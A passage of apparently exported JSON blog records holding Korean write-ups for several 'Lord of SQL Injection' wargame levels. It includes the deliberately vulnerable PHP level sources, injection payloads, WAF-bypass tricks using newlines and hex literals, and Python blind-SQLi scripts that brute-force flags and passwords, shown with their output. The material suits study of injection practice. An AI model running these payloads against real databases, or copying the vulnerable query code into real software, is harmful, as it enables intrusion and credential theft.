발생한다.Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Conversion failed when converting the varchar value 'uawe0f9ji34fjkl' to data type int.친절하게 pw의 값을 출력 해 주었다.이제 이 값을 입력하면 문제를 풀 수 있다.?id=admin&amp;pw=uawe0f9ji34fjkl------------------------------------------------------------------------------------------------query : select id from prob_nessie where id='admin' and pw='uawe0f9ji34fjkl'------------------------------------------------------------------------------------------------NESSIE Clear!&lt;?php  include \"./config.php\";  login_chk();  $db = mssql_connect();  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['id'])) exit(\"No Hack ~_~\");  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['pw'])) exit(\"No Hack ~_~\");  $query = \"select id from prob_nessie where id='{$_GET['id']}' and pw='{$_GET['pw']}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  sqlsrv_query($db,$query);  if(sqlsrv_errors()) exit(mssql_error(sqlsrv_errors()));  $query = \"select pw from prob_nessie where id='admin'\";   $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));  if($result['pw'] === $_GET['pw']) solve(\"nessie\");   highlight_file(__FILE__);?&gt;NESSIE Clear",
        "url": "//wargame/lord%20of%20sql%20injection/2019/07/05/los-nessie.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-07-04-los-poltergeist-html": {
        "title": "[Lord of SQL Injection] LoS - poltergeist 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 4, 2019",
        "author": "",
        "category": "",
        "content": "다음 문제는 poltergeist 이다.이번 문제는 소스 코드를 좀 많이 짜야했다.코드는 다음과 같다.-----------------------------------------------------------------query : select id from member where id='admin' and pw=''-----------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  $db = sqlite_open(\"./db/poltergeist.db\");  $query = \"select id from member where id='admin' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = sqlite_fetch_array(sqlite_query($db,$query));  if($result['id']) echo \"&lt;h2&gt;Hello {$result['id']}&lt;/h2&gt;\";  if($poltergeistFlag === $_GET['pw']) solve(\"poltergeist\");// Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.  highlight_file(__FILE__);?&gt;내가 입력 한 값은 member라는 테이블에서 값을 추출하는 쿼리에 들어가는데, 문제를 풀기 위해서는 $poltergeistFlag라는 변수의 값을 입력 해 주어야 한다.또한 이 변수의 값은 이미 선언되어 있는 값이고, 주석에 해당 값은 flag_{$hash}라는 테이블에 들어 가 있다고 한다.즉, 주석에 적혀있는데로 데이터베이스를 다 뒤져야 한다. ㅠㅠ문제를 풀기 위해서는 먼저 테이블 명을 알고, 그 다음 컬럼 명 마지막으로 테이블명과 컬럼명을 바탕으로 데이터를 추출해야 한다.SQLite는 데이터베이스의schema를 sqlite_master라는 테이블에 저장하고 있다.따라서 테이블명과 컬럼명을 알기 위해서는 해당 테이블을 이용하면 된다.테이블 명과 컬럼 명을 알 수 있는 쿼리문은 다음과 같다.select sql from sqlite_master where tbl_name like 'flag_%';해당 쿼리를 입력하면 sqlite_master이라는 테이블에서 tbl_name 즉, 테이블 명이 flag_%의 형태로 이루어진 행을 찾아 그 행의 sql 열의 값을 추출한다.%는 와일드카드로, 모든 문자를 의미하며, like 사용 시 %를 사용할 수 있다.따라서 tbl_name like 'flag_%' 구문은 flag_a, flag_123처럼 테이블 명에 flag_이 있고 해당 문자 뒤에 어떤 문자라도 들어있다면 대상에 속한다.sql에는 해당 테이블을 생성하는 쿼리문이 저장되어 있다.즉, create 문이 저장되어 있는 것이다.이제 테이블 명과 컬럼명을 알아낼 수 있는 쿼리문을 찾았으니, 해당 쿼리문을 문제의 쿼리문에 더해서 하나의 쿼리문으로 만들어야 한다.현재 문제에 있는 쿼리는 다음과 같다.select id from member where id='admin' and pw='{$_GET[pw]}'따라서 내가 입력 한 값은 $_GET[pw]에 입력되기 때문에 서브쿼리 형태로 넣어주어야 한다.이를 위해 아래와 같이 쿼리를 구성했다.# 길이 구하기select id from member where id='admin' and pw='1' or id='admin' and length((select sql from sqlite_master where tbl_name like 'flag_%'))=1 -- '# 내용 구하기select id from member where id='admin' and pw='1' or id='admin' and substr((select sql from sqlite_master where tbl_name like 'flag_%'), 1, 1)='a또한 위의 방법으로 찾은 테이블 명과 컬럼 명을 가지고 플래그를 찾기 위해서는 아래의 쿼리를 사용했다.select COLUMN_NAME from TABLE_NAME이를 코드로 구현하면 다음과 같다.import urllib2import urllibimport requeststable = \"\"column = \"\"flag = \"\"sql = \"\"length = 0url = \"https://los.rubiya.kr/chall/poltergeist_a62c7abc7e6ce0080dbf0e14a07d1f1d.php?pw=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the SQL\"for i in range(0, 100):        try:                query = url + \"1' or id='admin' and length((select sql from sqlite_master where tbl_name like 'flag_%'))=\" + str(i) + \" -- \"                r = requests.post(query, cookies=session)        except:                print \"[-] Error occur\"                continue        if 'Hello admin' in r.text:                length = i                breakprint \"[+] Found length : \", lengthprint \"[+] Find SQL\"for j in range(1, length + 1):        for i in range(32, 128):                try:                        query = url + \"1' or id='admin' and substr((select sql from sqlite_master where tbl_name like 'flag_%'), \" + str(j) + \", 1)='\" + chr(i)                        r = requests.post(query, cookies=session)                except:                        print \"[-] Error occur\"                        continue                if 'Hello admin' in r.text:                        sql += chr(i)                        print \"[+] Found \" + str(j), \":\", sql                        breakprint \"[+] Found SQL : \", sqltable = sql.split(\"`\")[1]column = sql.split(\"`\")[3]print \"[+] Find length of the flag\"for i in range(0, 100):        try:                query = url + \"1' or id='admin' and length((select \" + column + \" from \" + table + \"))=\" + str(i) + \" -- \"                r = requests.post(query, cookies=session)        except:                print \"[-] Error occur\"                continue        if 'Hello admin' in r.text:                length = i                breakprint \"[+] Found length : \", lengthprint \"[+] Find flag\"for j in range(1, length + 1):        for i in range(32, 128):                try:                        query = url + \"1' or id='admin' and substr((select \" + column + \" from \" + table + \"), \" + str(j) + \", 1)='\" + chr(i)                        r = requests.post(query, cookies=session)                except:                        print \"[-] Error occur\"                        continue                if 'Hello admin' in r.text:                        flag += chr(i)                        print \"[+] Found \" + str(j), \":\", flag                        breakprint \"[+] Found flag : \", flagprint \"[+] End\"해당 코드를 실행하면 결과는 다음과 같다.$ python test.py [+] Start[+] Find length of the SQL[+] Found length :  54[+] Find SQL[+] Found 1 : C[+] Found 2 : CR[+] Found 3 : CRE[+] Found 4 : CREA[+] Found 5 : CREAT[+] Found 6 : CREATE[+] Found 7 : CREATE [+] Found 8 : CREATE T[+] Found 9 : CREATE TA[+] Found 10 : CREATE TAB[+] Found 11 : CREATE TABL[+] Found 12 : CREATE TABLE[+] Found 13 : CREATE TABLE [+] Found 14 : CREATE TABLE `[+] Found 15 : CREATE TABLE `f[+] Found 16 : CREATE TABLE `fl[+] Found 17 : CREATE TABLE `fla[+] Found 18 : CREATE TABLE `flag[+] Found 19 : CREATE TABLE `flag_[+] Found 20 : CREATE TABLE `flag_7[+] Found 21 : CREATE TABLE `flag_70[+] Found 22 : CREATE TABLE `flag_70c[+] Found 23 : CREATE TABLE `flag_70c8[+] Found 24 : CREATE TABLE `flag_70c81[+] Found 25 : CREATE TABLE `flag_70c81d[+] Found 26 : CREATE TABLE `flag_70c81d9[+] Found 27 : CREATE TABLE `flag_70c81d99[+] Found 28 : CREATE TABLE `flag_70c81d99`[+] Found 29 : CREATE TABLE `flag_70c81d99` [+] Found 30 : CREATE TABLE `flag_70c81d99` ([+] Found 33 : CREATE TABLE `flag_70c81d99` (`[+] Found 34 : CREATE TABLE `flag_70c81d99` (`f[+] Found 35 : CREATE TABLE `flag_70c81d99` (`fl[+] Found 36 : CREATE TABLE `flag_70c81d99` (`fla[+] Found 37 : CREATE TABLE `flag_70c81d99` (`flag[+] Found 38 : CREATE TABLE `flag_70c81d99` (`flag_[+] Found 39 : CREATE TABLE `flag_70c81d99` (`flag_0[+] Found 40 : CREATE TABLE `flag_70c81d99` (`flag_08[+] Found 41 : CREATE TABLE `flag_70c81d99` (`flag_087[+] Found 42 : CREATE TABLE `flag_70c81d99` (`flag_0876[+] Found 43 : CREATE TABLE `flag_70c81d99` (`flag_08762[+] Found 44 : CREATE TABLE `flag_70c81d99` (`flag_087628[+] Found 45 : CREATE TABLE `flag_70c81d99` (`flag_0876285[+] Found 46 : CREATE TABLE `flag_70c81d99` (`flag_0876285c[+] Found 47 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`[+] Found 49 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`T[+] Found 50 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`TE[+] Found 51 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`TEX[+] Found 52 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`TEXT[+] Found 54 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`TEXT)[+] Found SQL :  CREATE TABLE `flag_70c81d99` (`flag_0876285c`TEXT)[+] Find length of the flag[+] Found length :  38[+] Find flag[+] Found 1 : F[+] Found 2 : FL[+] Found 3 : FLA[+] Found 4 : FLAG[+] Found 5 : FLAG{[+] Found 6 : FLAG{e[+] Found 7 : FLAG{ea[+] Found 8 : FLAG{ea5[+] Found 9 : FLAG{ea5d[+] Found 10 : FLAG{ea5d3[+] Found 11 : FLAG{ea5d3b[+] Found 12 : FLAG{ea5d3bb[+] Found 13 : FLAG{ea5d3bbd[+] Found 14 : FLAG{ea5d3bbdc[+] Found 15 : FLAG{ea5d3bbdcc[+] Found 16 : FLAG{ea5d3bbdcc4[+] Found 17 : FLAG{ea5d3bbdcc4a[+] Found 18 : FLAG{ea5d3bbdcc4ae[+] Found 19 : FLAG{ea5d3bbdcc4aec[+] Found 20 : FLAG{ea5d3bbdcc4aec9[+] Found 21 : FLAG{ea5d3bbdcc4aec9a[+] Found 22 : FLAG{ea5d3bbdcc4aec9ab[+] Found 23 : FLAG{ea5d3bbdcc4aec9abe[+] Found 24 : FLAG{ea5d3bbdcc4aec9abe4[+] Found 25 : FLAG{ea5d3bbdcc4aec9abe4a[+] Found 26 : FLAG{ea5d3bbdcc4aec9abe4a6[+] Found 27 : FLAG{ea5d3bbdcc4aec9abe4a6a[+] Found 28 : FLAG{ea5d3bbdcc4aec9abe4a6a9[+] Found 29 : FLAG{ea5d3bbdcc4aec9abe4a6a9f[+] Found 30 : FLAG{ea5d3bbdcc4aec9abe4a6a9f6[+] Found 31 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66[+] Found 32 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66e[+] Found 33 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66ea[+] Found 34 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaa[+] Found 35 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa[+] Found 36 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa1[+] Found 37 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13[+] Found 38 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}[+] Found flag :  FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}[+] End모든 데이터베이스를 뒤진 후에 플래그를 찾을 수 있었다.따라서 아래의 값을 입력하면 문제를 풀 수 있다.?pw=FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}--------------------------------------------------------------------------------------------------------------------query : select id from member where id='admin' and pw='FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}'--------------------------------------------------------------------------------------------------------------------POLTERGEIST Clear!&lt;?php  include \"./config.php\";  login_chk();  $db = sqlite_open(\"./db/poltergeist.db\");  $query = \"select id from member where id='admin' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = sqlite_fetch_array(sqlite_query($db,$query));  if($result['id']) echo \"&lt;h2&gt;Hello {$result['id']}&lt;/h2&gt;\";  if($poltergeistFlag === $_GET['pw']) solve(\"poltergeist\");// Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.  highlight_file(__FILE__);?&gt;POLTERGEIST Clear",
        "url": "//wargame/lord%20of%20sql%20injection/2019/07/04/los-poltergeist.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-07-03-los-banshee-html": {
        "title": "[Lord of SQL Injection] LoS - banshee 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 3, 2019",
        "author": "",
        "category": "",
        "content": "분명히 하루에 한개씩 올리기로 했는데 몇 주 정신없다가 정신차려보니 벌써 7월이다.몇 개 안남았으니 후딱 올려야겠다.SQLite의 세 번째 문제이다.코드는 다음과 같다.-----------------------------------------------------------------query : select id from member where id='admin' and pw=''-----------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  $db = sqlite_open(\"./db/banshee.db\");  if(preg_match('/sqlite|member|_/i', $_GET[pw])) exit(\"No Hack ~_~\");   $query = \"select id from member where id='admin' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = sqlite_fetch_array(sqlite_query($db,$query));  if($result['id']) echo \"&lt;h2&gt;login success!&lt;/h2&gt;\";  $query = \"select pw from member where id='admin'\";   $result = sqlite_fetch_array(sqlite_query($db,$query));  if($result['pw'] === $_GET['pw']) solve(\"banshee\");   highlight_file(__FILE__);?&gt;이번에는 id는 입력받지 않고, pw만 입력 받는다.id='admin'는 이미 있기 때문에, 문제를 풀기 위해서는 admin의 정확한 pw값을 입력해야 한다.그래서 아래와 같이 소스코드를 구현했다.import urllib2import urllibimport requestsflag = \"\"length = 0url = \"https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php?pw=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the password\"for i in range(0, 20):\ttry:\t\tquery = url + \"1' or id='admin' and length(pw)=\" + str(i) + \" -- \"\t\tr = requests.post(query, cookies=session)\texcept:\t\tprint \"[-] Error occur\"\t\tcontinue\tif 'login success!' in r.text:\t\tlength = i\t\tbreakprint \"[+] Found length : \", lengthprint \"[+] Find password\"for j in range(1, length + 1):\tfor i in range(48, 128):\t\ttry:\t\t\tquery = url + \"1' or id='admin' and substr(pw, \" + str(j) + \", 1)='\" + chr(i)\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif 'login success!' in r.text:\t\t\tflag += chr(i)\t\t\tprint \"[+] Found \" + str(j), \":\", flag\t\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"먼저 1' or id='admin' and length(pw)=1 형태의 쿼리를 입력 해 pw의 길이를 알아냈다.이 후, pw의 값을 한 글자 씩 찾아 비교하기 위해 substr(pw, 1, 1)='a'의 쿼리를 사용했다.해당 코드를 실행하면 결과는 다음과 같다.$ python ex.py [+] Start[+] Find length of the password[+] Found length :  8[+] Find password[+] Found 1 : 0[+] Found 2 : 03[+] Found 3 : 031[+] Found 4 : 0313[+] Found 5 : 03130[+] Found 6 : 031309[+] Found 7 : 0313091[+] Found 8 : 0313091b[+] Found password :  0313091b[+] End정상적으로 pw 값을 추출할 수 있었다.해당 값을 아래와 같이 입력하면 문제를 풀 수 있다.?pw=0313091b--------------------------------------------------------------------------query : select id from member where id='admin' and pw='0313091b'--------------------------------------------------------------------------login success!BANSHEE Clear!&lt;?php  include \"./config.php\";  login_chk();  $db = sqlite_open(\"./db/banshee.db\");  if(preg_match('/sqlite|member|_/i', $_GET[pw])) exit(\"No Hack ~_~\");   $query = \"select id from member where id='admin' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = sqlite_fetch_array(sqlite_query($db,$query));  if($result['id']) echo \"&lt;h2&gt;login success!&lt;/h2&gt;\";  $query = \"select pw from member where id='admin'\";   $result = sqlite_fetch_array(sqlite_query($db,$query));  if($result['pw'] === $_GET['pw']) solve(\"banshee\");   highlight_file(__FILE__);?&gt;BANSHEE Clear",
        "url": "//wargame/lord%20of%20sql%20injection/2019/07/03/los-banshee.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-06-19-los-manticore-html": {
        "title": "[Lord of SQL Injection] LoS - manticore 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "June 19, 2019",
        "author": "",
        "category": "",
        "content": "SQLite의 두 번째 문제이다.이 번 문제도 간단한 편이다.코드는 다음과 같다.-----------------------------------------------------------------query : select id from member where id='' and pw=''-----------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  $db = sqlite_open(\"./db/manticore.db\");  $_GET['id'] = addslashes($_GET['id']);  $_GET['pw'] = addslashes($_GET['pw']);  $query = \"select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = sqlite_fetch_array(sqlite_query($db,$query));  if($result['id'] == \"admin\") solve(\"manticore\");  highlight_file(__FILE__);?&gt;언뜻 보면 이 전 문제랑 동일해 보인다.그런데 이번에는 addslashes가 추가되어 있다.처음엔 이걸 어떻게 풀어야 하나 고민했었다.그러다 문득 든 생각이 SQLite에서 \\'를 입력했을 때 과연 이걸 \\와 '로 인식할까 혹은 '를 문자열 안에서 쓰기 위해 앞에 \\를 삽입 한 것으로 인식할까였다.그래서 인터넷에서 SQLite를 테스트 할 수 있는 사이트를 찾아 직접 실행 해 보았다.https://sqliteonline.com/위의 사이트에서 아래와 같이 입력 해 보았다.SELECT '\\'';만약 \\'를 \\와 '로 인식한다면 오류가 날 것이고, '를 입력하기 위해 \\를 사용한 것으로 인식한다면 '를 출력 할 것이다.그 결과 아래와 같이 오류가 나는 것을 알 수 있었다.Uncaught Error: unrecognized token: \"'\\'';\"그리고 아까 입력 한 쿼리에서 '를 하나 빼면 정상적으로 \\가 출력되었다.즉, addslashes를 통해 ' 앞에 \\를 추가하더라도, 정상적으로 문자열을 닫을 수 있다.그래서 문제를 풀기 위해 아래와 같은 쿼리를 사용했다.?id=a' or id=char(97,100,109,105,110) -- &amp;pw=asd완성되는 쿼리는 다음과 같다.select id from member where id='a\\' or id=char(97,100,109,105,110) -- ' and pw='asd'where절만 살펴보면, 앞의 id='a\\'는 id가 a\\인 값을 찾는 조건이 된다.id가 a\\인 값은 없을 것이므로 or 뒤의 조건을 실행한다.id=char(97,100,109,105,110)인데, id='admin'을 넣으면 addslashes 때문에 id=\\'admin\\'이 되기 때문에 char()을 사용해 id가 admin인 행을 추출하도록 했다.이 후 뒤의 부분은 주석처리 되어 실행하지 않을 것이다.위의 쿼리를 넘겨준 결과 문제를 풀 수 있었다.-------------------------------------------------------------------------------------------------query : select id from member where id='a\\' or id=char(97,100,109,105,110) -- ' and pw='asd'-------------------------------------------------------------------------------------------------MANTICORE Clear!&lt;?php  include \"./config.php\";  login_chk();  $db = sqlite_open(\"./db/manticore.db\");  $_GET['id'] = addslashes($_GET['id']);  $_GET['pw'] = addslashes($_GET['pw']);  $query = \"select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = sqlite_fetch_array(sqlite_query($db,$query));  if($result['id'] == \"admin\") solve(\"manticore\");  highlight_file(__FILE__);?&gt;MANTICORE Clear!",
        "url": "//wargame/lord%20of%20sql%20injection/2019/06/19/los-manticore.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-06-18-los-chupacabra-html": {
        "title": "[Lord of SQL Injection] LoS - chupacabra 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "June 18, 2019",
        "author": "",
        "category": "",
        "content": "오늘 부터는 두 번째 업데이트에 올라온 문제다.이 전까지는 DBMS가 MySQL만 있었는데, 두 번째에 업데이트 된 문제는 SQLite, MSSQL, MongoDB를 사용하는 문제였다.먼저 SQLite의 첫 번째 문제이다.코드는 다음과 같다.-----------------------------------------------------------------query : select id from member where id='' and pw=''-----------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  $db = sqlite_open(\"./db/chupacabra.db\");  $query = \"select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = sqlite_fetch_array(sqlite_query($db,$query));  if($result['id'] == \"admin\") solve(\"chupacabra\");  highlight_file(__FILE__);?&gt;첫 번째 문제라 그런지 매우 간단하다.그냥 id가 admin인 값만 뽑아내면 된다.가장 기본 방식인 '와 --을 사용 해 아래와 같이 문제를 풀 수있었다.?id=admin' -- &amp;pw=a그럼 완성되는 쿼리는 아래와 같다.select id from member where id='admin' -- ' and pw='a'id='admin' 까지만 실행하고 --가 삽입되며 뒤의 값은 주석처리 된다.제일 간단한 방법으로 풀 수 있는 문제였다.-------------------------------------------------------------------------query : select id from member where id='admin' -- ' and pw='a'-------------------------------------------------------------------------CHUPACABRA Clear!&lt;?php  include \"./config.php\";  login_chk();  $db = sqlite_open(\"./db/chupacabra.db\");  $query = \"select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = sqlite_fetch_array(sqlite_query($db,$query));  if($result['id'] == \"admin\") solve(\"chupacabra\");  highlight_file(__FILE__);?&gt;CHUPACABRA Clear!",
        "url": "//wargame/lord%20of%20sql%20injection/2019/06/18/los-chupacabra.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-06-17-los-cyclops-html": {
        "title": "[Lord of SQL Injection] LoS - cyclops 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "June 17, 2019",
        "author": "",
        "category": "",
        "content": "드디어 첫 번째 문제 업데이트의 마지막 문제인 cyclops 이다.이번 문제는 단순히 admin으로 로그인을 하는 문제가 아니었다.코드는 다음과 같다.-----------------------------------------------------------------query : select id,pw from prob_cyclops where id='' and pw=''-----------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  $db = dbconnect();  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[id])) exit(\"No Hack ~_~\");  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");  $query = \"select id,pw from prob_cyclops where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysqli_fetch_array(mysqli_query($db,$query));  if(($result['id'] === \"first\") &amp;&amp; ($result['pw'] === \"second\")) solve(\"cyclops\");//must use union select  highlight_file(__FILE__);?&gt;이번에는 id가 first, pw가 second여야 한다.주석에 must use union select라고 적혀있는 것으로 보아 union select 'first', 'second' 같은 형태로 만들면 될 것 같다.그래서 일단 아래처럼 시도 해 보았다.?id=1' union select 'first', 'second'#&amp;pw=a그럼 완성되는 쿼리는 아래와 같을 것이다.select id,pw from prob_cyclops where id='1' union select 'first', 'second'#' and pw='a''and pw='a'는 주석처리 되어 실행되지 않기 때문에 결과적으로 union select 'first', 'second만 실행되며 fist, second만 추출 될 것이라고 생각했다.그런데 저렇게 값을 넣으니까 방화벽에 잡혔다 ㅠㅠ그렇게 호락호락한 문제가 아니었다 ㅠㅠ그 뒤로 이것저것 시도 해 보다가 개행 문자(%0a%0d)를 넣어주면 방화벽에 잡히지 않는다는 것을 찾을 수 있었다.또한 select 'first', 'second' 처럼 썼더니 또 방화벽에 걸려서 select 0x6669727374, 0x7365636f6e64''를 사용했다.0x6669727374는 first이고, 0x7365636f6e64는 second이며 뒤의 ''는 아무 출력도 하지 않을 것이다.최종적으로 입력한 값은 아래와 같다.?id=1'%23&amp;pw=%0a%0dunion %23%0a%0ddistinct select 0x6669727374, 0x7365636f6e64''%23%23(#)과 %0a%0d(개행문자)는 그래도 URL Encoding 해서 넘겨주었다.그러면 완성되는 쿼리는 아래와 같다.select id,pw from prob_cyclops where id='1'#' and pw=' union # distinct select 0x6669727374, 0x7365636f6e64''#'첫 줄의 id='1'#' and pw='에서 id='1' 뒤의 값은 # 때문에 주석처리 된다.개행 된 쿼리를 보고싶다면, 개행문자를 입력한 후 Ctrl + u를 통해 소스보기를 하면 아래와 같이 확인할 수 있다.&lt;hr&gt;query : &lt;strong&gt;select id,pw from prob_cyclops where id='1'#' and pw='union #distinct select 0x6669727374, 0x7365636f6e64''#'&lt;/strong&gt;&lt;hr&gt;어쨌든 이를 통해 문제를 풀 수 있었다.---------------------------------------------------------------------------------------------------------------------------------query : select id,pw from prob_cyclops where id='1'#' and pw=' union # distinct select 0x6669727374, 0x7365636f6e64''#'---------------------------------------------------------------------------------------------------------------------------------CYCLOPS Clear!&lt;?php  include \"./config.php\";  login_chk();  $db = dbconnect();  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[id])) exit(\"No Hack ~_~\");  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");  $query = \"select id,pw from prob_cyclops where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysqli_fetch_array(mysqli_query($db,$query));  if(($result['id'] === \"first\") &amp;&amp; ($result['pw'] === \"second\")) solve(\"cyclops\");//must use union select  highlight_file(__FILE__);?&gt;CYCLOPS Clear!",
        "url": "//wargame/lord%20of%20sql%20injection/2019/06/17/los-cyclops.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-06-14-los-godzilla-html": {
        "title": "[Lord of SQL Injection] LoS - godzilla 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "June 14, 2019",
        "author": "",
        "category": "",
        "content": "다음 문제는 godzilla이다.이번 문제는 Blind SQL Injection이다.코드는 다음과 같다.-----------------------------------------------------------------query : select id from prob_godzilla where id='' and pw=''-----------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  $db = dbconnect();  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[id])) exit(\"No Hack ~_~\");  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");  $query = \"select id from prob_godzilla where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysqli_fetch_array(mysqli_query($db,$query));  if($result['id']) echo \"&lt;h2&gt;Hello admin&lt;/h2&gt;\";     $_GET[pw] = addslashes($_GET[pw]);  $query = \"select pw from prob_godzilla where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysqli_fetch_array(mysqli_query($db,$query));  if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"godzilla\");  highlight_file(__FILE__);?&gt;거의 앞의 문제와 동일하지만 이번에는 admin의 정확한 pw까지 입력해야 문제를 풀 수 있다.앞의 문제를 풀며 방화벽을 어떻게 우회할 수 있는지 알았으니, 아래와 같이 소스코드를 구현해서 admin의 pw 값을 알아냈다.import urllib2import urllibimport requestsflag = \"\"length = 0url = \"https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php?id=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the password\"for i in range(0, 20):\ttry:\t\tquery = url + \"-1'&lt;@=1 OR id='admin' and length(pw)=\" + str(i) + \" OR '&amp;pw=a\"\t\tr = requests.post(query, cookies=session)\texcept:\t\tprint \"[-] Error occur\"\t\tcontinue\tif 'Hello admin' in r.text:\t\tlength = i\t\tbreakprint \"[+] Found length : \", lengthprint \"[+] Find password\"for j in range(1, length + 1):\tfor i in range(48, 128):\t\ttry:\t\t\tquery = url + \"-1'&lt;@=1 OR id='admin' and substr(pw, \" + str(j) + \", 1)='\" + chr(i) + \"' OR '&amp;pw=a\"\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif 'Hello admin' in r.text:\t\t\tflag += chr(i)\t\t\tprint \"[+] Found \" + str(j), \":\", flag\t\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"먼저 pw의 길이를 알아내기 위해 length()를, pw를 한 글자 씩 알아내기 위해 substr()를 사용했다.그 결과는 아래와 같다.$ python ex.py [+] Start[+] Find length of the password[+] Found length :  8[+] Find password[+] Found 1 : A[+] Found 2 : A1[+] Found 3 : A18[+] Found 4 : A18A[+] Found 5 : A18A6[+] Found 6 : A18A6C[+] Found 7 : A18A6CC[+] Found 8 : A18A6CC5[+] Found password :  A18A6CC5[+] End여태까지의 경험으로 볼 때, 패스워드의 값은 항상 알파벳 소문자였으므로, 나온 결과값을 소문자로 바꾸어 입력하면 문제를 풀 수 있다.?id=admin&amp;pw=a18a6cc5---------------------------------------------------------------------------query : select id from prob_godzilla where id='admin' and pw='a18a6cc5'---------------------------------------------------------------------------Hello adminGODZILLA Clear!&lt;?php  include \"./config.php\";  login_chk();  $db = dbconnect();  if(preg_match('/prob|_|\\.|\\(\\)/i', 